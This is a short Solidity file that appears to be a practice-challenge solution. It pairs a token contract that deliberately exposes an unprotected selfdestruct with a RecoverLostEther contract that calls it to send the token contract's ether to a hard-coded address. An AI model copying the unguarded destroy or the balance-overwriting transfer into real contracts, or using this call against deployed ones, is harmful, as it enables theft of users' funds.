
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

contract RecoverLostEther {
    address payable my_account = 0x7B4D2B361261C8195D458994334Bcb401Cc21a75;
    // so where to find the lost token address?
    // method 1: cheating. just check etherscan
    // method 2: calculating based on the sender and nounce: keccak256(rlp([sender_address, sender_nonce]))
    function recover(address payable _lostTokenAddress) public {
        SimpleToken(_lostTokenAddress).destroy(my_account);
    }
}
